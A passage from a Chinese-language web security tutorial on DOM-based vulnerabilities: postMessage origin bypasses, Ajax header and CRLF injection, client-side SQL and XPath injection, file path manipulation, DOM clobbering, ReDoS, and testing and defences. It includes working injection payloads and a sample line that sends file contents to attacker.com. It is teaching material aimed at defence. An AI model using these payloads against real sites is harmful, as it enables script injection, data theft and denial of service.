- **作为 source：** 接收消息的一方如果以不安全的方式处理 `event.data`（例如传给 `eval()` 或 `innerHTML`），那么传入的 Web 消息就成为了攻击者可控的"源"。这对应于"控制 Web 消息源"——攻击者的消息被接收端当作数据源使用。

### 核心漏洞：缺失或有缺陷的源验证

Web Message 漏洞的根源几乎总是**源验证的缺失或缺陷**。考虑下面这个典型的漏洞代码：

```javascript
window.addEventListener('message', function(e) {
    eval(e.data);
});
```

**代码解释：** 这段代码监听来自其他窗口的消息，直接将 `e.data` 传给 `eval()` 执行。问题在于：(1) 没有验证消息来源 `e.origin`，信任了任意来源的消息；(2) `eval()` 是最危险的 sink 之一。攻击者只需要在自己的页面上通过 `postMessage('alert(document.cookie)', '*')` 向包含这段代码的页面发送消息，就能在受害者浏览器中执行任意 JavaScript。

攻击者可以通过构造 iframe 来交付攻击载荷：

```html
<iframe src="https://vulnerable-website.com" onload="this.contentWindow.postMessage('print()','*')">
```

当 iframe 加载完成后，`onload` 事件触发，恶意页面通过 `postMessage()` 向目标窗口发送 JavaScript 代码。接收端的事件监听器不加验证地将消息内容传递给 `eval()`，代码随即执行。

### 源验证绕过技术

即使开发者添加了源验证，实现上的缺陷仍然可能让验证失效。以下是三种常见的绕过模式：

**`indexOf` 缺陷：**

```javascript
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
```

**代码解释：** `indexOf` 方法只是检查字符串 `'normal-website.com'` 是否**出现在** origin URL 中的任意位置，而不是检查 origin 是否**精确等于**目标域名。攻击者可以注册一个域名如 `normal-website.com.evil.net`，其 origin 字符串中包含了目标域名字符串，从而绕过验证。

**`endsWith` 缺陷：**

```javascript
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```

此代码会将 origin `http://www.malicious-websitenormal-website.com` 视为安全，因为字符串确实以 `normal-website.com` 结尾。

**`startsWith` 缺陷：** 同理，仅检查前缀同样会被 `normal-website.com.evil.net` 绕过。

### 攻击构造

完整的攻击链如下：

1. 攻击者创建恶意页面，其中包含一个指向目标站点的 iframe。
2. 当 iframe 加载完成后，攻击者的页面通过 `iframe.contentWindow.postMessage(maliciousPayload, '*')` 发送恶意数据。
3. 目标页面的 `message` 事件监听器接收到消息。
4. 如果源验证缺失或存在缺陷，监听器将消息数据传递给危险的 sink（`eval()`、`innerHTML` 等）。
5. 恶意代码在目标站点的上下文中执行。

### 防御：严格的源验证

正确验证消息源的做法是进行**精确比较**：

```javascript
window.addEventListener('message', function(e) {
    if (e.origin === 'https://trusted-site.com') {
        // 安全地处理 e.data
    }
});
```

- 始终使用 `===` 进行精确的源比较，不要使用 `indexOf`、`startsWith` 或 `endsWith`。
- 发送消息时，指定精确的 `targetOrigin` 而非通配符 `'*'`。
- 即使源验证通过，也要对 `e.data` 的内容进行必要的净化和校验，避免将不可信数据传入危险的 DOM sink。
- 如果不需要接收跨源消息，完全不要注册 `message` 事件监听器。

## 5.3 Ajax 请求头操控

### XMLHttpRequest.setRequestHeader() 作为 sink

当脚本将攻击者可控制的数据写入 Ajax 请求的 HTTP 请求头时，`XMLHttpRequest.setRequestHeader()` 就成为一个危险的 sink。

```javascript
// 从 URL 参数中获取攻击者控制的值
var headerValue = new URLSearchParams(location.search).get('x-custom-header');
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/user/profile', true);
// 漏洞：将用户可控的数据直接设置为请求头
xhr.setRequestHeader('X-Custom-Header', headerValue);
xhr.send();
```

**代码解释：**

- `location.search` 获取 URL 中的查询字符串，攻击者通过构造 URL 完全控制参数值。
- `XMLHttpRequest.setRequestHeader(header, value)` 是核心 sink——它将攻击者可控的数据设置为 HTTP 请求头。如果后端根据请求头来做出安全决策（如身份认证、角色判断、请求路由），攻击者就能绕过这些机制。
- `xhr.open(method, url, async)` 也是一个潜在 sink，如果 URL 参数被攻击者控制，可以改变请求的目标地址。

### CRLF 注入与请求走私

最危险的利用方式是 CRLF 注入（回车换行注入）。HTTP 协议使用 `\r\n` 分隔请求头和请求体。如果攻击者能在请求头值中注入换行符，就可能构造出额外的 HTTP 请求。例如，配合 URL `#值\r\nContent-Length: 0\r\n\r\nGET /admin/delete HTTP/1.1`，攻击者可以在一个 HTTP 请求中嵌入第二个完整的请求。

### 请求头注入与逻辑绕过

除请求走私外，请求头操控还可以用于：

- **逻辑绕过：** 如果后端通过 `X-Forwarded-For` 或 `X-Admin-Token` 等自定义头做权限判断，攻击者可以伪造这些头来提升权限。
- **缓存投毒：** 某些请求头会影响缓存键，攻击者可以通过注入恶意头来污染缓存内容，使其他用户请求到被篡改的响应。

### 防御

避免允许来自任何不可信源的数据动态设置 Ajax 请求头。如果必须动态设置，使用白名单限制请求头的名称和值，并严格过滤 CRLF 字符（`\r`、`\n`）。

---

# 六、特殊注入类型

除了上一节讨论的安全边界绕过技术，还有一类漏洞直接复刻了经典服务端攻击在客户端环境中的表现。这些"客户端注入"虽然大多依赖已被废弃或使用有限的 API，但它们的漏洞模式具有广泛的教学意义——理解这些模式，就等于理解了注入攻击的底层逻辑。

## 6.1 客户端 SQL 注入

### executeSql() 与 Web SQL

客户端 SQL 注入漏洞出现在脚本以不安全的方式将攻击者可控的数据拼接到客户端 SQL 查询中时。虽然 Web SQL Database API（`executeSql()`）已被 W3C 废弃，但同样的漏洞模式在 SQLite（通过 WebAssembly 在浏览器中运行）或 React Native 等环境中仍然存在。

### 漏洞代码：字符串拼接

```javascript
// 漏洞代码：通过字符串拼接将用户输入直接内嵌到 SQL 语句中
var username = new URLSearchParams(location.search).get('user');
var query = "SELECT * FROM users WHERE username = '" + username + "'";
db.transaction(function(tx) {
    tx.executeSql(query, [], function(tx, results) {
        // 处理查询结果
    });
});
```

**代码解释：** 漏洞的核心在于字符串拼接——将用户输入直接嵌入 SQL 语句，没有做任何转义或参数化处理。攻击者构造 URL `?user=admin' OR '1'='1`，查询变为 `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`，返回所有用户数据。输入 `'; DROP TABLE users; --` 则可能删除整个表。

### 安全代码：参数化查询

```javascript
// 安全：使用 ? 占位符进行参数化查询
var username = new URLSearchParams(location.search).get('user');
var query = "SELECT * FROM users WHERE username = ?";
db.transaction(function(tx) {
    tx.executeSql(query, [username], function(tx, results) {
        // 处理查询结果
    });
});
```

**代码解释：** 参数化查询是防御 SQL 注入的标准方案。`?` 占位符标记了用户输入的位置，数据库引擎将参数值与 SQL 语句**分开处理**——先解析 SQL 语句的结构，再将参数值**作为纯数据**绑定到占位符上。无论 `username` 中包含什么特殊字符，它们都会被当作普通字符串内容，而不会被解释为 SQL 语法的一部分。这个两步处理机制从根本上杜绝了 SQL 注入的可能。

将所有数据库查询都使用参数化查询，即使是那些看起来"不可控"的数据——代码库变更可能使曾经安全的数据变得危险，养成习惯可以避免疏漏。

## 6.2 客户端 XPath 注入

### document.evaluate() 作为 sink

`document.evaluate()` 是 DOM Level 3 XPath API 的核心方法，用于在浏览器端对 DOM 文档执行 XPath 查询。当攻击者可控的数据被拼接到 XPath 表达式中时，就形成了客户端 XPath 注入漏洞。

```javascript
// 漏洞代码：直接将 URL 参数拼接到 XPath 表达式中
var userName = new URLSearchParams(location.search).get('user');
var xpath = "//user[@name='" + userName + "']";
var result = document.evaluate(
    xpath, document, null,
    XPathResult.ORDERED_NODE_ITERATOR_TYPE, null
);
```

### 攻击技术

**突破字符串限制（跳出 XPath 属性条件）：**
```
输入: admin' or '1'='1
拼接后: //user[@name='admin' or '1'='1']
效果: 条件永远为真，返回文档中所有 <user> 节点
```

**使用 XPath 的 Union 操作符：**
```
输入: admin'] | //password['
拼接后: //user[@name='admin'] | //password['']
效果: 同时查询 user 和 password 节点
```

**盲注提取数据（Blind XPath Injection）：**
```
输入: ' or string-length(//secret) > 10 and '1'='1
利用 XPath 的 string-length() 和 substring() 函数逐字符提取数据
```

### XPath 注入 vs SQL 注入对比

| 特性 | SQL 注入 | XPath 注入 |
|------|---------|-----------|
| 查询对象 | 关系型数据库 | XML/HTML DOM 文档 |
| 权限模型 | 细粒度（表级、列级） | 无内建权限控制——可访问整个文档 |
| 注释符 | `--`、`#`、`/**/` | XPath 本身无注释符，但可通过构造无效谓词实现类似效果 |
| 字符串拼接 | `'`、`"` | `'`、`"` |
| Union 操作 | `UNION SELECT` | `|`（管道符，取节点集并集） |
| 布尔盲注 | `AND 1=1` / `AND 1=2` | `and '1'='1'` / `and '1'='2'`（在 XPath 谓词内） |

一个值得注意的关键区别是：XPath 查询没有内建的权限模型——攻击者一旦成功注入，就可以访问整个 XML/HTML 文档的任意节点。这使其在某些场景下的危害甚至超过 SQL 注入。

### 防御

避免将用户输入直接拼接到 XPath 表达式中。对输入进行严格白名单校验，过滤 XPath 特殊字符（`'`、`"`、`[`、`]`、`/`、`(`、`)`、`|`、`=`、`<`、`>`）。

## 6.3 本地文件路径操纵

### FileReader API 作为 sink

本地文件路径操纵漏洞出现在脚本将攻击者可控制的数据作为文件名参数传递给文件处理 API 时。

```javascript
// 从 URL 片段中获取文件名
var filename = location.hash.slice(1);
// 漏洞：将攻击者控制的文件名传递给 FileReader API
var reader = new FileReader();
reader.onload = function(e) {
    // 将文件内容发送到攻击者的服务器
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.target.result));
};
window.requestFileSystem(window.TEMPORARY, 1024*1024, function(fs) {
    fs.root.getFile(filename, {}, function(fileEntry) {
        fileEntry.file(function(file) {
            reader.readAsText(file);
        });
    });
});
```

**代码解释：**

- `location.hash` 是攻击者可控的来源，攻击者可以构造 URL 如 `https://victim.com/page#/etc/passwd` 来指定任意文件名。
- 相关的 FileReader sink 包括：`readAsText()`（以文本形式读取）、`readAsDataURL()`（Base64 编码读取）、`readAsArrayBuffer()`（二进制读取）、`readAsBinaryString()`（二进制字符串读取）。
- 攻击链路：攻击者诱导用户访问恶意 URL -> 页面从 `location.hash` 读取文件名 -> 通过 FileReader API 读取用户本地文件系统中的指定文件 -> 文件内容通过回调被发送到攻击者控制的服务器。

### 浏览器沙箱限制

浏览器对本地文件系统的访问通常限于沙箱目录，攻击者无法直接读取 `C:\windows\system32\config\sam` 这样的系统文件。然而，攻击者仍然可以读取应用存储在沙箱中的敏感数据——如 IndexedDB 导出的数据、应用配置文件及其他 Web 应用在浏览器存储中的私密信息。

### 防御

永远不要将不可信源的数据作为文件名传递给文件处理 API。如需选择文件，应使用 `<input type="file">` 让用户主动选择，而不是通过代码指定路径。如果必须访问文件系统，在服务端进行严格的路径白名单校验。

---

# 七、高级攻击技术

前文讨论的漏洞都依赖于 JavaScript 代码本身将不可信数据传递给危险的 sink。但有一类攻击颠覆了这个前提——它不利用代码，而是利用浏览器将 HTML 元素暴露为 JavaScript 全局变量的行为，通过注入纯 HTML 来改写 JavaScript 程序的逻辑。此外，正则表达式的算法特性本身也会成为拒绝服务攻击的温床。

## 7.1 DOM Clobbering

### 核心洞察：HTML 元素如何成为 JavaScript 变量

DOM Clobbering（DOM 篡改）利用的是浏览器的一个历史悠久的行为：HTML 元素如果拥有 `id` 或 `name` 属性，浏览器会自动创建同名的全局 JavaScript 变量，指向对应的 DOM 元素。例如，页面中如果存在 `<a id="someObject">`，那么 `window.someObject` 就会自动指向这个 `<a>` 元素。

"clobbering" 一词形象地描述了攻击的本质——攻击者通过注入 HTML 元素来"砸毁"（覆盖）JavaScript 本应使用的全局变量或对象属性。

DOM Clobbering 在不满足 XSS 条件但能够控制页面上的某些 HTML 时特别有用——例如 HTML 过滤器允许 `id` 或 `name` 属性通过白名单检查。

### 漏洞模式：`var x = window.x || {}`

JavaScript 开发者常用的一种防御性编码模式恰是 DOM Clobbering 的主要攻击面：

```javascript
var someObject = window.someObject || {};
```

这段代码的本意是：如果全局变量 `someObject` 已经存在，就使用它；否则初始化为空对象。但如果攻击者在页面上注入了带有 `id="someObject"` 的 HTML 元素，`window.someObject` 就会指向这个 DOM 节点而非预期的 JavaScript 对象，随后的代码以非预期的方式操作这个被篡改的引用。

### 攻击示例一：基于锚元素的脚本注入

考虑以下代码：

```javascript
window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
};
```

**代码解释：** 这段代码在页面加载完成后尝试获取 `window.someObject` 的 `url` 属性，用它作为动态加载脚本的 `src`。如果攻击者能够注入以下 HTML：

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

**Payload 解释：** 这里用了两个拥有相同 `id="someObject"` 的 `<a>` 标签。由于相同 ID 的元素在 DOM 中会形成一个 HTML 集合（HTMLCollection），浏览器会自动创建全局变量 `window.someObject` 指向这个集合。第二个 `<a>` 标签有 `name="url"` 属性，这会覆盖集合的 `url` 属性，使其指向 `//malicious-website.com/evil.js`。于是，原代码中的 `someObject.url` 取到恶意的脚本 URL，导致页面加载并执行攻击者的 JavaScript。整个攻击中，攻击者只注入了纯 HTML，没有注入任何 `<script>` 标签或事件处理器。

### 攻击示例二：基于表单的属性覆盖绕过过滤器

另一种常见技术利用 `form` 元素配合 `input` 元素来覆盖 DOM 节点的属性，从而绕过客户端过滤器：

```html
<form onclick=alert(1)><input id=attributes>Click me
```

**Payload 解释：** 插入的 `<input id=attributes>` 元素覆盖了 `<form>` 元素原本的 `attributes` 属性。当客户端的过滤代码遍历 `<form>` 元素的 `attributes` 时，它实际上遍历的是这个 `<input>` 子元素。由于 `<input>` 的 length 未定义，过滤器的 `for` 循环条件（例如 `i < element.attributes.length`）不满足，过滤器直接跳过而不检查 `onclick` 等危险属性，从而让 `alert(1)` 成功执行。

这个例子展示了 DOM Clobbering 如何在不触碰 JavaScript 代码的情况下，通过扰乱 DOM 结构来瘫痪安全过滤机制。

### 防御原则

DOM Clobbering 的防御依赖于两条核心原则：

1. **类型检查：** 在使用全局变量或属性之前，验证其类型是否符合预期。例如，检查 DOM 节点的 `attributes` 属性是否确实是 `NamedNodeMap` 的实例，而不是一个被篡改的 HTML 元素。使用 `instanceof` 操作符进行严格的类型判断。

2. **避免不安全的编码模式：** 避免使用 `var x = window.x || {}` 这样的逻辑或运算符模式引用全局变量。如果必须使用，先检查该变量是否为 DOM 节点（通过 `instanceof HTMLElement` 或检查 `nodeType` 属性）。

另外，使用经过充分测试的净化库如 DOMPurify，它在设计时就考虑了 DOM Clobbering 的防护。

## 7.2 拒绝服务（ReDoS）

### 灾难性回溯

正则表达式拒绝服务（ReDoS，Regular Expression Denial of Service）利用了某些正则表达式在特定输入下的**灾难性回溯（Catastrophic Backtracking）**特性。当攻击者能够控制传递给正则表达式引擎的模式或输入字符串时，可以构造特定输入使匹配操作消耗指数级时间，导致浏览器主线程阻塞、页面冻结甚至崩溃。

灾难性回溯的核心机制是：正则引擎在匹配失败时会尝试所有可能的匹配路径（回溯）。如果正则模式包含嵌套量词（如 `(a+)+`、`([a-zA-Z]+)*`），当输入字符串大量匹配模式的前半部分但最终失败时，引擎会穷举所有可能的分配组合，导致计算量指数增长。

### 漏洞模式：`new RegExp(userInput)`

最危险的模式是让攻击者控制正则表达式本身：

```javascript
var userPattern = location.hash.slice(1);
// 攻击者访问: /page#(a+)+$
var regex = new RegExp(userPattern);
var testStr = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!';
regex.test(testStr); // 浏览器冻结！
```

次危险的模式是攻击者控制被匹配的输入字符串，而目标正则恰好存在灾难性回溯风险：

```javascript
var userInput = location.hash.slice(1);
var regex = /^(a+)+$/; // 存在灾难性回溯风险的固定正则
regex.test(userInput);
// 攻击者访问: /page#aaaaaaaaaaaaaaaaaaaaaaab
// 回溯次数随输入长度指数增长
```

**回溯过程（以 `/^(a+)+$/` 和输入 `"aaaaab"` 为例）：**

1. 外层的 `+` 将内层的 `a+` 匹配的多个 `a` 进行分组。
2. 内层 `a+` 匹配到末尾的 `b` 时失败。
3. 外层回溯：减少一组，内层重试。
4. 对所有可能的分配组合进行穷举：N 个 `a` 分配给 1 组有 1 种方式，分配给 2 组有 N-1 种方式，分配给 3 组有 C(N-1,2) 种方式……总尝试次数呈指数增长，接近 O(2^n)。

### 经典危险正则模式

| 危险模式 | 说明 | 触发输入示例 |
|---------|------|------------|
| `(a+)+` | 嵌套量词 | `aaaaaaaaaaa!` |
| `(a\|aa)+` | 交替+量词 | `aaaaaaaaaaa!` |
| `([a-zA-Z]+)*` | 字符组+嵌套量词 | `aaaa...!` |
| `(a+)+$` | 带结尾锚定的嵌套量词 | `aaaa...b` |
| `(.*a){n}` (n 较大) | 贪婪匹配+固定重复 | 极长字符串 |

### requestFileSystem() 存储 DoS

另一个较少见的 DoS 向量是利用 `requestFileSystem()` API 耗尽浏览器的存储配额。该 API 已被大多数现代浏览器废弃（Chrome 在 2023 年移除了它），但在遗留应用中仍可能存在风险。攻击者如果能够控制写入文件系统的数据大小，可以重复写入大量数据，导致正常应用无法使用 `localStorage`、`IndexedDB` 等共享配额的存储 API。

### 防御

**针对 ReDoS：**
- 永远不要让用户控制正则表达式模式字符串。`new RegExp(userInput)` 是极其危险的模式。
- 如果必须在正则中使用用户输入，对正则特殊字符进行彻底转义（`\`、`.`、`*`、`+`、`?`、`(`、`)`、`[`、`]`、`{`、`}`、`^`、`$`、`|` 等）。
- 避免编写包含嵌套量词的正则表达式。
- 对正则匹配添加超时机制（可通过 Web Worker 实现超时终止）。

**针对存储 DoS：**
- 限制单次写入大小，不允许用户控制写入数据量。
- 在写入前检查可用配额。
- 对写入操作添加频率限制和总量上限。

---

# 八、测试方法与综合防御

在系统性地了解了 DOM-based 漏洞的各种形态之后，我们需要回答两个实践问题：如何找到这些漏洞，以及如何从根本上杜绝它们。

## 8.1 如何测试 DOM-based 漏洞

测试 DOM-based 漏洞需要依次检查每个可用的源，并对每个源单独进行测试。浏览器开发者工具是完成这项工作最重要的工具。

### 测试 HTML sink

对于 HTML sink（如 `innerHTML`、`document.write()` 等），测试步骤如下：

1. 将一个随机的字母数字字符串放入源中（如 `location.search`）。例如在 URL 后添加 `?test=abc123`。
2. 使用浏览器开发者工具检查 DOM，找到你的字符串出现的位置。注意使用开发者工具的"检查元素"功能，而不是"查看源代码"——后者不会反映 JavaScript 对 DOM 的动态修改。
3. 对于字符串出现的每个位置，识别其上下文（是否在 HTML 标签之间？是否在属性值中？是否在 JavaScript 字符串字面量中？）。
4. 基于上下文改进输入以测试注入边界。如果字符串出现在双引号属性中，尝试注入 `"` 看是否能跳出属性。如果出现在 `<script>` 标签内的字符串中，尝试注入 `'; alert(1);//` 来闭合字符串并执行代码。
5. 最终构造完整的攻击载荷以验证 XSS 是否可行。

### 测试 JavaScript 执行 sink

对于 JavaScript 执行 sink（如 `eval()`、`setTimeout()` 等），测试更为复杂，因为攻击载荷不一定显示在 DOM 中：

1. 使用开发者工具的搜索功能（Chrome 中为 `Ctrl+Shift+F`，即"在所有文件中搜索"）在每个潜在的源中搜索变量名（如 `location`、`location.hash`、`document.referrer` 等）。
2. 找到源被引用的位置后，使用 JavaScript 调试器添加断点。
3. 逐步跟踪源的值如何从读取点流动到 sink。变量可能被赋值给其他变量——需要反复搜索和跟踪。
4. 当发现一个 sink 正在接收源自源的数据时，使用调试器检查变量的运行时值，确认数据确实从源传播到了 sink。
5. 改进输入以构造成功的注入。

### 浏览器 URL 编码差异

一个重要的实践细节：不同浏览器对 URL 的编码行为存在差异。Chrome、Firefox 和 Safari 会对 `location.search` 和 `location.hash` 的内容进行 URL 编码，而 IE11 和旧版 Edge 不会。如果数据在被处理之前被 URL 编码了，XSS 攻击的成功率会大幅降低。测试时应考虑目标用户群可能使用的浏览器。

## 8.2 综合防御原则

DOM-based 漏洞的防御没有万能药——不同的漏洞类型需要不同的防护措施。但以下原则构成了防御体系的骨架。

### 根本原则：不要让不可信数据进入 sink

所有 DOM-based 漏洞的本质都是：攻击者可控的数据进入了危险的 sink。最有效的防御是在架构层面避免这种数据流。如果确实无法避免，则必须在数据到达 sink 之前施加充分的验证。

### 白名单校验 vs 黑名单过滤

黑名单过滤（禁止已知危险字符或模式）本质上是一场必输的竞赛——攻击者总能找到新型的绕过方式。白名单校验（只允许已知安全的字符或模式）虽然实施成本更高，但安全保证更强。例如，对于 `document.domain`，只允许设置为预定义的域名列表中的值；对于重定向目标 URL，只允许属于已知安全域名的地址。

### 上下文相关的编码

不同的 sink 需要不同的编码策略：

- **HTML 上下文：** 使用 HTML 实体编码（`<` 变为 `&lt;`，`"` 变为 `&quot;`）。
- **JavaScript 上下文：** 使用 JavaScript 转义（`'` 变为 `\'`，换行变为 `\n`）。
- **URL 上下文：** 使用 `encodeURIComponent()` 对 URL 参数进行百分号编码。
- **CSS 上下文：** 使用 CSS 转义。

关键认知：为错误的上下文应用编码等于没有编码。将数据插入 `innerHTML` 时使用 URL 编码是无效的。必须根据数据最终所处的确切位置选择正确的编码方式。

### 使用安全 API

许多 DOM-based 漏洞可以通过简单地选择更安全的 API 来避免：

- 用 `textContent` 替代 `innerHTML`——`textContent` 只设置纯文本，不会解析 HTML。
- 用参数化查询替代字符串拼接——防止 SQL 注入和 XPath 注入。
- 用 `addEventListener('message', handler)` 配合精确的 `event.origin` 比较，替代宽松的源验证模式。
- 用 `JSON.stringify()` 构建 JSON 对象，替代手动拼接 JSON 字符串。

### CSP 作为纵深防御

内容安全策略（Content Security Policy）可以作为额外的防御层。严格的 CSP（如 `script-src 'self'`）可以阻止内联脚本执行，使即使成功注入 `<script>` 标签或内联事件处理器的 XSS 攻击也无法执行。但 CSP 应被视为**最后一道防线**，而非唯一的防御手段——漏洞本身仍应被修复。

### DOM Clobbering 专项防御

对于 DOM Clobbering，核心防御手段是类型检查。在引用全局变量后，使用 `instanceof` 验证其类型是否为预期的 JavaScript 对象，而非 DOM 节点。例如：

```javascript
var config = window.config || {};
// 防御 clobbering：验证 config 不是被注入的 HTML 元素
if (config instanceof HTMLElement) {
    config = {};
}
```

同时，避免使用 `var x = window.x || {}` 这种容易被 clobber 的编码模式。如果必须访问全局变量，将其封装在严格检查的结构中。
